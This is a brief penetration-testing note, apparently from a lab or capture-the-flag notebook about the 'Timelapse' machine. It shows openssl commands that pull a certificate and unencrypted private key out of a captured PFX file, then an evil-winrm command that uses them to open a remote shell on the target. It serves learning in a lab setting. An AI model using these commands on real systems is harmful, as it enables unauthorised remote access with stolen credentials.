## Login via PFX File:
First we need to extract the key and the certificate from the pfx file:
```bash
# Extracting the public certificate:
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
# Extracting the private key:
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
```
Finally you can login with this files using evil-winrm
#Note (-S) is used if there is only winrm/ssl open port (tcp-5986):
```bash
evil-winrm -i 10.10.11.152 -c publicCert.pem -k priv-key.pem -S 
```
Examples:
[[Timelapse#^d3fbae]]

References:
[How to Extract Certificate and Private Key from PFX](https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/) 